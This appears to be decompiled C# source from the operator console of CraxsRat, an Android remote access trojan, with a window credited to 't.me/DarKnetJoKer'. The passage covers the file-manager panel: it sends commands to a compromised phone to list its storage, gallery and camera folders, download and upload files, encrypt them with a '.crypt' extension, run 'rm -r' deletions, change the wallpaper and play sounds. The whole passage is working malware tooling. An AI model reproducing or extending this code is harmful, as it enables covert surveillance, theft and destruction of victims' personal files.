		this.DrakeUIButtonIcon5.Size = new System.Drawing.Size(33, 26);
		this.DrakeUIButtonIcon5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon5.Symbol = 61473;
		this.DrakeUIButtonIcon5.TabIndex = 28;
		this.DrakeUIButtonIcon4.CircleRectWidth = 2;
		this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.ForePressColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(9, 10);
		this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
		this.DrakeUIButtonIcon4.Radius = 0;
		this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.Transparent;
		this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(33, 26);
		this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon4.Symbol = 61608;
		this.DrakeUIButtonIcon4.TabIndex = 27;
		this.DrakeWidth_W1.BackColor = System.Drawing.Color.SkyBlue;
		this.DrakeWidth_W1.Location = new System.Drawing.Point(10, 45);
		this.DrakeWidth_W1.Name = "DrakeWidth_W1";
		this.DrakeWidth_W1.Size = new System.Drawing.Size(800, 1);
		this.DrakeWidth_W1.TabIndex = 23;
		this.PB.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.PB.ForeColor = System.Drawing.Color.SkyBlue;
		this.PB.Location = new System.Drawing.Point(89, 9);
		this.PB.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.PB.Name = "PB";
		this.PB.Size = new System.Drawing.Size(438, 26);
		this.PB.TabIndex = 5;
		this.Timer2.Interval = 1000;
		base.AutoScaleDimensions = new System.Drawing.SizeF(7f, 17f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(1016, 850);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel3);
		this.DoubleBuffered = true;
		this.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.ForeColor = System.Drawing.Color.White;
		base.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.MinimumSize = new System.Drawing.Size(701, 897);
		base.Name = "FileManager By t.me/DarKnetJoKer";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		this.Text = "FileManager By t.me/DarKnetJoKer";
		this.ctxMenu.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGVDATA).EndInit();
		this.Panel6.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.viwimage).EndInit();
		((System.ComponentModel.ISupportInitialize)this.usrscreen).EndInit();
		((System.ComponentModel.ISupportInitialize)this.Usrbtry).EndInit();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
		this.Panel4.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		base.ResumeLayout(false);
	}

	private void SpyStyle()
	{
	}

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				cancelbtn.Text = "停止";
				cancelbtn.Text = "清除";
				Downpic.Text = "下载";
				sdbtn.Text = "SD卡";
				dcmbtn.Text = "画廊";
				picbtn.Text = "图片";
				ThumbsCont.Text = "以前见过的使用";
				DGV0.Columns[0].HeaderText = "类型";
				DGV0.Columns[1].HeaderText = "姓名";
				DGV0.Columns[2].HeaderText = "尺寸";
				DGV0.Columns[3].HeaderText = "修改日期";
				DGV0.Columns[4].HeaderText = "创建日期";
				ctxMenu.Items[0].Text = "打开";
				ctxMenu.Items[1].Text = "复制";
				ctxMenu.Items[2].Text = "切";
				ctxMenu.Items[3].Text = "粘贴";
				ctxMenu.Items[4].Text = "下载";
				ctxMenu.Items[5].Text = "上传";
				ctxMenu.Items[6].Text = "加密";
				ctxMenu.Items[7].Text = "解密";
				ctxMenu.Items[8].Text = "压缩";
				ctxMenu.Items[9].Text = "解压";
				ctxMenu.Items[10].Text = "删除";
				ctxMenu.Items[11].Text = "创建文件";
				ctxMenu.Items[12].Text = "改名";
				ctxMenu.Items[13].Text = "编辑";
				ctxMenu.Items[14].Text = "隐藏";
				ctxMenu.Items[15].Text = "取消隐藏";
				ctxMenu.Items[16].Text = "设置为墙纸";
				ctxMenu.Items[17].Text = "播放声音";
				ctxMenu.Items[18].Text = "下载";
			}
		}
		else
		{
			cancelbtn.Text = "إيقاف";
			cancelbtn.Text = "حذف";
			Downpic.Text = "التحميلات";
			sdbtn.Text = "زاكرة الهاتف";
			dcmbtn.Text = "المعرض";
			picbtn.Text = "الصور";
			ThumbsCont.Text = "عرض من المحمل مسبقا";
			DGV0.Columns[0].HeaderText = "النوع";
			DGV0.Columns[1].HeaderText = "الأسم";
			DGV0.Columns[2].HeaderText = "الحجم";
			DGV0.Columns[3].HeaderText = "تاريخ التعديل";
			DGV0.Columns[4].HeaderText = "تاريخ الأنشاء";
			ctxMenu.Items[0].Text = "فتح";
			ctxMenu.Items[1].Text = "نسخ";
			ctxMenu.Items[2].Text = "قص";
			ctxMenu.Items[3].Text = "لصق";
			ctxMenu.Items[4].Text = "تحميل";
			ctxMenu.Items[5].Text = "إرسال ملف";
			ctxMenu.Items[6].Text = "تشفير";
			ctxMenu.Items[7].Text = "فك التشفير";
			ctxMenu.Items[8].Text = "ضغط";
			ctxMenu.Items[9].Text = "فك الضغط";
			ctxMenu.Items[10].Text = "حذف";
			ctxMenu.Items[11].Text = "إنشاء ملف";
			ctxMenu.Items[12].Text = "إعادة تسمية";
			ctxMenu.Items[13].Text = "تعديل";
			ctxMenu.Items[14].Text = "إخفاء";
			ctxMenu.Items[15].Text = "إظهار";
			ctxMenu.Items[16].Text = "تعين كخلفية الهاتف";
			ctxMenu.Items[17].Text = "تشغيل مقطع صوتي";
			ctxMenu.Items[18].Text = "التحميلات";
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxcaxca(object sender, EventArgs e)
	{
		SetStyle(ControlStyles.UserPaint | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, value: true);
		base.ActiveControl = DGV0;
		base.Tag = "File" + classClient.UUID;
		Timer1.Start();
		Q = Convert.ToString(MySettingsProperty.Settings.ImageQualty);
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\9.ico");
		usrscreen.Image = reso.GetScreen(classClient.Screen);
		CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax();
		Timer2.Start();
		DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		DGV0.DefaultCellStyle.Font = reso.f;
		Text = Title;
		try
		{
			if (classClient.Row == null)
			{
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Label1.Text = "CraxsRat.vip";
		OpenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		OpenToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\open.png");
		OpenToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		DownloadToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\download.png");
		DownloadToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		UploadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		UploadToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\upload.png");
		UploadToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		EncryptToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		EncryptToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\encrypt.png");
		EncryptToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		DecodeToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		DecodeToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\decode.png");
		DecodeToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		ZipToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\zip.png");
		ZipToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		UnZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		UnZipToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\unzip.png");
		UnZipToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		DeleteToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\delete.png");
		DeleteToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		AddFilesToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\add.png");
		AddFilesToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		RenameToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\rename.png");
		RenameToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		EditToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		EditToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\edit.png");
		EditToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		HideToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		HideToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\hidden.png");
		HideToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		ShowToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		ShowToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\show.png");
		ShowToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		FolderDownloadsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		FolderDownloadsToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\downloads.png");
		FolderDownloadsToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		CutToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\cut.png");
		CutToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		CopyToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\copy.png");
		CopyToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		PasteToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\paste.png");
		PasteToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		SetWallpaperToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\wallpaper.png");
		SetWallpaperToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		PlaySoundToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		PlaySoundToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\playsound.png");
		PlaySoundToolStripMenuItem.Tag = new object[3] { 0, "null", "null" };
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	private void DGV0_SortCompare(object sender, DataGridViewSortCompareEventArgs e)
	{
		if (e.RowIndex1 == 0)
		{
			e.Handled = true;
		}
	}

	private void DGV0_CellMouseDoubleClick(object sender, DataGridViewCellMouseEventArgs e)
	{
		try
		{
			string text = DGV0.CurrentRow.Index.ToString();
			string key = pathtxt.Text;
			if (!paths_indexs.Contains(key))
			{
				paths_indexs.Add(new object[1] { text }, key);
				Correntindex = DGV0.CurrentRow.Index;
			}
			else
			{
				object[] array = (object[])paths_indexs[key];
				string left = Conversions.ToString(array[0]);
				if (Operators.CompareString(left, DGV0.CurrentRow.Index.ToString(), TextCompare: false) != 0)
				{
					Correntindex = DGV0.CurrentRow.Index;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (e.RowIndex > 0 && e.ColumnIndex >= 0)
		{
			if (Operators.ConditionalCompareObjectEqual(DGV0.Rows[e.RowIndex].Cells[0].Tag, "0", TextCompare: false))
			{
				if (classClient != null)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA, Pnext(Conversions.ToString(DGV0.Tag), Conversions.ToString(DGV0.Rows[e.RowIndex].Cells[1].Value))),
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
				return;
			}
			string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[e.RowIndex].Cells[1].Value));
			string left2 = Conversions.ToString(DGV0.Rows[e.RowIndex].Cells[0].Tag);
			string text3 = Conversions.ToString(DGV0.Rows[e.RowIndex].Cells[1].Value);
			if (Operators.CompareString(left2, "1", TextCompare: false) != 0)
			{
				return;
			}
			if (ISupportedText(text3.ToLower()))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(DGV0.Rows[e.RowIndex].Cells[2].Tag);
				if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, TextCompare: false))
				{
					Interaction.MsgBox(string.Format(FSize, RuntimeHelpers.GetObjectValue(DGV0.Rows[e.RowIndex].Cells[2].Value), RuntimeHelpers.GetObjectValue(DGV0.Rows[e.RowIndex].Cells[1].Value)), MsgBoxStyle.Critical, reso.nameRAT);
				}
				else if (classClient != null)
				{
					object[] parametersObjects2 = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.editor + Data.SPL_SOCKET + "edit" + Data.SPL_DATA + text2,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects2);
				}
				return;
			}
			object obj = "null";
			obj = (ISupportedImages(text3.ToLower()) ? "false" : ((!ISupportedVideo(text3.ToLower())) ? "null" : "true"));
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", TextCompare: false))) && classClient != null)
			{
				string[] array2 = classClient.Keys.Split(':');
				object[] parametersObjects3 = new object[4]
				{
					Client,
					Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "small" + Data.SPL_DATA + array2[0] + Data.SPL_DATA + array2[1] + Data.SPL_DATA + text2 + Data.SPL_DATA, obj), Data.SPL_DATA), Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + classClient.UUID),
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects3);
			}
		}
		else if (e.RowIndex == 0 && e.ColumnIndex >= 0 && classClient != null)
		{
			object[] parametersObjects4 = new object[4]
			{
				Client,
				Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA, Pback(Conversions.ToString(DGV0.Tag))),
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects4);
		}
	}

	private object Pback(string p)
	{
		string text = string.Format("{0}", p.Substring(0, p.LastIndexOf("/")));
		return text.Contains("/") ? text : "/";
	}

	private object Pnext(string p, string n)
	{
		return $"{p}/{n}";
	}

	private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "1", TextCompare: false) == 0)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
					if (classClient != null)
					{
						string[] array = classClient.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "download" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + text + Data.SPL_DATA + SecurityKey.down_info + Data.SPL_DATA + SecurityKey.downByte + "File" + classClient.UUID + Data.SPL_DATA + "File" + classClient.UUID,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient == null)
		{
			return;
		}
		FilesUpload.Title = "Please select Files";
		FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		FilesUpload.Filter = "all Files|*.*";
		FilesUpload.FileName = string.Empty;
		FilesUpload.Multiselect = true;
		if (FilesUpload.ShowDialog() != DialogResult.OK || classClient == null)
		{
			return;
		}
		string[] fileNames = FilesUpload.FileNames;
		if (fileNames.Length <= 0)
		{
			return;
		}
		string[] array = fileNames;
		foreach (string fileName in array)
		{
			string[] array2 = classClient.Keys.Split(':');
			try
			{
				FileInfo fileInfo = new FileInfo(fileName);
				string text = Conversions.ToString(fileInfo.Length);
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), fileInfo.Name));
				string name = fileInfo.Name;
				string fullName = fileInfo.FullName;
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "upload" + Data.SPL_DATA + array2[0] + Data.SPL_DATA + array2[1] + Data.SPL_DATA + text2 + Data.SPL_DATA + text + Data.SPL_DATA + name + Data.SPL_DATA + fullName + Data.SPL_DATA + SecurityKey.upload_info + Data.SPL_DATA + SecurityKey.uploadByte,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ViewToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				if (Operators.CompareString(left, "1", TextCompare: false) == 0)
				{
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
					string text2 = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value);
					object obj = "null";
					obj = (ISupportedImages(text2.ToLower()) ? "false" : ((!ISupportedVideo(text2.ToLower())) ? "null" : "true"));
					if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", TextCompare: false))) && classClient != null)
					{
						string[] array = classClient.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							Client,
							Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "small" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + text + Data.SPL_DATA, obj), Data.SPL_DATA), Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + classClient.UUID),
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	private void ExternalStorageDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DirectoryDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get1",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DirectoryPicturesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get2",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void DirectoryDCIMToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get3",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void CustomToolStripMenuItem_Click(object sender, EventArgs e)
	{
		inp inp2 = new inp();
		inp2.Text = "Access Path";
		inp2.LTitle.Text = "Add path";
		inp2.InputText.Text = ((DGV0.Tag.ToString().Length == 0) ? "/" : DGV0.Tag.ToString());
		inp2.StartPosition = FormStartPosition.Manual;
		inp2.Location = Codes.FixSize(this, inp2);
		DialogResult dialogResult = inp2.ShowDialog(this);
		if (dialogResult == DialogResult.OK && classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + inp2.InputText.Text,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
		inp2.Close();
	}

	private void FolderDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			string text = classClient.FolderUSER + "\\Downloads";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
	}

	private void DecodeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient == null)
		{
			return;
		}
		inp inp2 = new inp();
		inp2.Text = "decryption";
		inp2.LTitle.Text = "Add decryption key";
		inp2.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
		inp2.StartPosition = FormStartPosition.Manual;
		inp2.Location = Codes.FixSize(this, inp2);
		DialogResult dialogResult = inp2.ShowDialog(this);
		checked
		{
			if (dialogResult == DialogResult.OK && classClient != null && DGV0.SelectedRows.Count > 0)
			{
				int num = DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", TextCompare: false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
						string text2 = null;
						string value = ".crypt";
						if (text.EndsWith(value))
						{
							int length = text.LastIndexOf(value);
							text2 = text.Substring(0, length);
						}
						else
						{
							text2 = text + ".decrypt";
						}
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "decrypt" + Data.SPL_DATA + text + Data.SPL_DATA + text2 + Data.SPL_DATA + inp2.InputText.Text,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
					}
				}
			}
			inp2.Close();
		}
	}

	private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient == null)
		{
			return;
		}
		inp inp2 = new inp();
		inp2.Text = "encryption";
		inp2.LTitle.Text = "Add encryption key";
		inp2.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
		inp2.StartPosition = FormStartPosition.Manual;
		inp2.Location = Codes.FixSize(this, inp2);
		DialogResult dialogResult = inp2.ShowDialog(this);
		checked
		{
			if (dialogResult == DialogResult.OK && classClient != null && DGV0.SelectedRows.Count > 0)
			{
				int num = DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", TextCompare: false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
						object[] parametersObjects = new object[4]
						{
							Client,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "encrypt" + Data.SPL_DATA + text + Data.SPL_DATA + ".crypt" + Data.SPL_DATA + inp2.InputText.Text,
							Codes.Encoding().GetBytes("null"),
							classClient
						};
						classClient.SendMessage(parametersObjects);
						MySettingsProperty.Settings.EncryptionKey = inp2.InputText.Text;
						MySettingsProperty.Settings.Save();
					}
				}
			}
			inp2.Close();
		}
	}

	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string left = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[0].Tag);
				string text = "del0";
				string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(DGV0.Tag, "/"), DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[1].Value));
				if (Operators.CompareString(left, "0", TextCompare: false) == 0)
				{
					text = "del1";
					string prm = text2;
					text2 = "rm -r" + Strings.Space(1) + Format_Space(prm);
				}
				if (classClient != null)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
